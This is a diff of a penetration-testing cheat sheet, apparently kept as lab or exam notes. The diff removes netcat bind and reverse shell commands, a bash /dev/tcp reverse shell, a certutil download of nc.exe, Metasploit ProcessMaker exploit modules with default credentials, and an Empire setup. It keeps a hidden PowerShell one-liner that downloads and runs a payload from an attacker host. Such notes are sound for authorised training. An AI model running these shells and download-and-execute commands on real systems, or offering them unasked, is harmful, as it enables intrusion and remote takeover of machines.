@@ -1,93 +1,6 @@
 ### Vulnerability Scanning
 ### Searching For Exploits
 
-
-### Bind and Reverse Shells
-```
-nc -help
-
--n : do not resolve hostnames
--v : verbosity, can be used multiple times
--l : listen
--p : local port number
--u : UDP instead of TCP
--e : execute command
-```
-
-```
-cd /usr/share/windows-resources/binaries/
-python -m SimpleHTTPServer 80
-
-certutil -urlcache -f http://<ip>/nc.exe nc.exe
-nc.exe -h
-```
-- Windows does not have `netcat` by default.
-
-#### Transferring Files
-```
-nc -nvlp <port> > received.txt
-nc -nv <ip> <port> < sent.txt
-```
-
-#### Bind Shells
-```
-nc -nvlp <port> -e /bin/bash
-nc -nv <ip> <port>
-```
-```
-nc -nvlp <port> -e cmd.exe
-nc -nv <ip> <port>
-```
-
-#### Reverse Shells
-```
-nc -nvlp <port>
-nc -nv <ip> <port> -e /bin/bash
-```
-```
-nc -nvlp <port>
-nc -nv <ip> <port> -e cmd.exe
-```
-```
-bash -i >& /dev/tcp/<ip>/<port> 0>&1
-```
-
-#### Useful Links
-- https://github.com/swisskyrepo/PayloadsAllTheThings
-- https://www.revshells.com/
-
-### Exploitation Frameworks
-#### MSF
-```
-nmap -Pn -sV <ip>
-
-searchsploit process maker
-
-search processmaker
-use exploit/multi/http/processmaker_plugin_upload
-use exploit/multi/http/processmaker_exec
-```
-- Both modules require credentials - default credentials are `admin / admin`.
-
-#### PowerShell-Empire (Empire)
-```
-sudo apt-get update && sudo apt-get install powershell-empire starkiller -y
-
-sudo powershell-empire server
-
-sudo powershell-empire client
-listeners
-agents
-
-https://localhost:1337
-empireadmin / password123
-```
-- https://www.kali.org/blog/empire-starkiller/ (Web GUI)
-
-### Windows Exploitation
-### Linux Exploitation
-
-
 ### Windows Privilege Escalation
 ```
 use exploit/multi/script/web_delivery
@@ -99,23 +12,6 @@ set LHOST <ip>
 powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\oPY153Pv.exe')"; (new-object System.Net.WebClient).DownloadFile('http://<ip>:<port>/5YaTnDgYGm1KPK', $z); invoke-item $z
 ```
 -  Listens on `8080` (Web) and `4444` (shell) by default after running `exploit`. Run generated PowerShell code on target to get a shell.
-
-#### PrivescCheck
-```
-powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
-```
-- https://github.com/itm4n/PrivescCheck
-
-#### psexec
-```
-which psexec.py
-psexec.py <username>@<ip>
-```
-```
-use exploit/windows/smb/psexec
-set SMBUser <username>
-set SMBPass <password>
-```
 
 #### MSHTA
 ```
